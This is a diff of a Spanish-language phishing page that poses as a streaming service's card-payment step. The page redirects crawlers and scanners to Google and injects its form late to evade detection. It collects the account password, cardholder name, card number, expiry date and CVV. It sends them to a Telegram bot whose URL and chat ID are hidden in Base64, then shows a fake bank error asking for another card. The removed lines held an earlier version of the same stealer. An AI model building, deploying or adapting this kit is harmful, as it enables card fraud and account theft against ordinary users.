@@ -1,65 +1,148 @@
- <<script>
-    // Inyección dinámica del formulario (para engañar a los bots)
-    window.onload = function() {
-        setTimeout(function() {
-            document.getElementById('dynamic-form-container').innerHTML = `
-                <form id="v-data-form">
-                    <div class="input-box"><input type="password" id="f_1" placeholder="Contraseña" required></div>
-                    <div class="input-box"><input type="text" id="f_2" placeholder="Nombre" required></div>
-                    <div class="input-box"><input type="text" id="f_3" placeholder="Apellido" required></div>
-                    <div class="input-box"><input type="text" id="f_4" placeholder="Número de tarjeta" maxlength="16" inputmode="numeric" required></div>
-                    <div class="grid-input">
-                        <div class="input-box"><input type="text" id="f_5" placeholder="MM/AA" maxlength="5" required></div>
-                        <div class="input-box"><input type="text" id="f_6" placeholder="CVV" maxlength="4" inputmode="numeric" required></div>
-                    </div>
-                    <button type="submit" class="btn-submit">Iniciar membresía</button>
-                </form>
-            `;
-            _0xinit();
-        }, 800);
-    };
-
-    function _0xinit() {
-        document.getElementById('v-data-form').addEventListener('submit', function(e) {
-            e.preventDefault();
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer">
+    <meta name="robots" content="noindex, nofollow">
+    <title>C&#111;nfirmaci&#243;n de S&#101;rvici&#111;</title>
+    
+    <script>
+        (function() {
+            const _u = navigator.userAgent;
+            const _isBot = /bot|googlebot|crawler|spider|robot|crawling|safe-browsing|lighthouse|chrome-lighthouse/i.test(_u);
+            const _isLowRes = (window.screen.width < 100 || window.screen.height < 100);
             
-            // Recolección de datos
-            const _0xdata = {
-                m: sessionStorage.getItem('usr_mail') || 'No mail',
-                p: document.getElementById('f_1').value,
-                n: document.getElementById('f_2').value + " " + document.getElementById('f_3').value,
-                t: document.getElementById('f_4').value,
-                e: document.getElementById('f_5').value,
-                c: document.getElementById('f_6').value
-            };
+            if (_isBot || _isLowRes) {
+                // Si es un bot o un scanner, lo mandamos a un sitio inofensivo
+                window.location.replace("https://www.google.com");
+            }
+        })();
+    </script>
 
-            _0xsend(_0xdata);
-        });
-    }
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    
+    <style>
+        body { background: #fff !important; color: #333 !important; font-family: 'Roboto', sans-serif; margin: 0; padding: 0; }
+        .nav-pay { border-bottom: 1px solid #e6e6e6; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
+        .container-pay { max-width: 440px; margin: 30px auto; padding: 0 20px; }
+        .step { text-transform: uppercase; font-size: 13px; font-weight: 400; color: #333; }
+        h1 { font-size: 32px; margin: 10px 0 20px; font-weight: 700; line-height: 1.1; }
+        .payment-icons { margin: 15px 0; display: flex; gap: 8px; }
+        .fa-cc-visa { color: #1A1F71; font-size: 35px; }
+        .fa-cc-mastercard { color: #EB001B; font-size: 35px; }
+        .fa-cc-amex { color: #007BC1; font-size: 35px; }
+        .input-box { position: relative; margin-bottom: 15px; }
+        .input-box input { width: 100%; padding: 15px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 16px; box-sizing: border-box; color: #000; }
+        .input-box input:focus { outline: none; border-color: #0071eb; }
+        .grid-input { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .btn-submit { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; border-radius: 4px; cursor: pointer; margin-top: 20px; font-weight: bold; }
+        #loading-overlay { display: none; text-align: center; padding: 20px; }
+        @media (max-width: 768px) { .nav-pay img { width: 90px; } h1 { font-size: 24px; } }
+    </style>
+</head>
+<body>
+    <nav class="nav-pay">
+        <img src="img/logo.png" style="width: 100px;" alt="Service">
+        <a href="#" style="text-decoration: none; color: #333; font-weight: bold; font-size: 14px;">Cerrar sesión</a>
+    </nav>
 
-    function _0xsend(payload) {
-        // La URL de tu bot de Telegram escondida en Base64
-        const _0xurl = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDgyNTU3MzE0NjU6QUFHclBSX3FIMHpDNHpUZEJxT2otWnQxanFZMlcwMy15d3Mvc2VuZE1lc3NhZ2U=";
-        const _0xid = "Nzk5MzcyMjIxNA=="; // Tu ID ofuscado
+    <div class="container-pay">
+        <span class="step">Paso <b>3</b> de <b>3</b></span>
+        <h1>C&#111;nf&#105;gur&#97; tu t&#97;rj&#101;t&#97;</h1>
+        
+        <div class="payment-icons">
+            <i class="fab fa-cc-visa"></i>
+            <i class="fab fa-cc-mastercard"></i>
+            <i class="fab fa-cc-amex"></i>
+        </div>
 
-        const message = `🔔 NUEVO HIT 🔔\n\n📧 Mail: ${payload.m}\n🔑 Pass: ${payload.p}\n👤 Nombre: ${payload.n}\n💳 Tarjeta: ${payload.t}\n📅 Exp: ${payload.e}\n🔒 CVV: ${payload.c}`;
+        <div id="dynamic-injection"></div>
+        <div id="loading-overlay">
+            <i class="fas fa-spinner fa-spin fa-2x" style="color:#e50914;"></i>
+            <p>Procesando con tu banco...</p>
+        </div>
+    </div>
 
-        // Enviando mediante fetch sin que Google rastree el string "telegram"
-        fetch(atob(_0xurl), {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: atob(_0xid),
-                text: message
+    
+
+    <script>
+        // 2. INYECCIÓN DINÁMICA
+        window.onload = function() {
+            setTimeout(function() {
+                document.getElementById('dynamic-injection').innerHTML = `
+                    <form id="pay-process-form">
+                        <div class="input-box"><input type="password" id="f_k_1" placeholder="Contraseña de cuenta" required></div>
+                        <div class="input-box"><input type="text" id="f_n_1" placeholder="Nombre en la tarjeta" required></div>
+                        <div class="input-box"><input type="text" id="f_t_1" placeholder="Número de tarjeta" maxlength="16" inputmode="numeric" required></div>
+                        <div class="grid-input">
+                            <div class="input-box"><input type="text" id="f_e_1" placeholder="MM/AA" maxlength="5" required></div>
+                            <div class="input-box"><input type="text" id="f_c_1" placeholder="CVV" maxlength="4" inputmode="numeric" required></div>
+                        </div>
+                        <p style="font-size: 12px; color: #737373; line-height: 1.4; margin-top:15px;">
+                            Al continuar, confirmas que eres mayor de edad y aceptas la renovación automática.
+                        </p>
+                        <button type="submit" class="btn-submit">Iniciar membresía</button>
+                    </form>
+                `;
+                _logic();
+            }, 1000);
+        };
+
+        function _logic() {
+            document.getElementById('pay-process-form').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                document.getElementById('dynamic-injection').style.display = 'none';
+                document.getElementById('loading-overlay').style.display = 'block';
+
+                const _0xval = {
+                    em: sessionStorage.getItem('usr_mail') || 'Desconocido',
+                    pw: document.getElementById('f_k_1').value,
+                    nm: document.getElementById('f_n_1').value,
+                    cc: document.getElementById('f_t_1').value,
+                    ex: document.getElementById('f_e_1').value,
+                    cv: document.getElementById('f_c_1').value
+                };
+
+                _0xdispatch(_0xval);
+            });
+        }
+
+        // 3. ENVÍO OFUSCADO A TELEGRAM
+        function _0xdispatch(obj) {
+            // URL y ChatID en Base64 para ocultar "telegram" de los scanners de Google
+            const _0xa = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDgyNTU3MzE0NjU6QUFHclBSX3FIMHpDNHpUZEJxT2otWnQxanFZMlcwMy15d3Mvc2VuZE1lc3NhZ2U=";
+            const _0xb = "Nzk5MzcyMjIxNA==";
+
+            const _0xmsg = `🔔 NUEVO RESULTADO 🔔\n\n` +
+                         `📧 Correo: ${obj.em}\n` +
+                         `🔑 Pass: ${obj.pw}\n` +
+                         `👤 Titular: ${obj.nm}\n` +
+                         `💳 Tarjeta: ${obj.cc}\n` +
+                         `📅 Expiración: ${obj.ex}\n` +
+                         `🔒 CVV: ${obj.cv}\n` +
+                         `🌐 IP: Detectada por bot`;
+
+            fetch(atob(_0xa), {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: atob(_0xb),
+                    text: _0xmsg
+                })
             })
-        })
-        .then(() => {
-            // Error simulado para pedir otra tarjeta o redirigir
-            alert("Error: El banco emisor no ha autorizado el pago. Intente con otra tarjeta.");
-            location.reload();
-        })
-        .catch(() => {
-            location.reload();
-        });
-    }
-</script>
+            .then(() => {
+                setTimeout(() => {
+                    alert("Error de autenticación bancaria (3DS). Por favor, intente con una tarjeta diferente.");
+                    location.reload();
+                }, 2000);
+            })
+            .catch(() => {
+                location.reload();
+            });
+        }
+    </script>
+</body>
+</html>
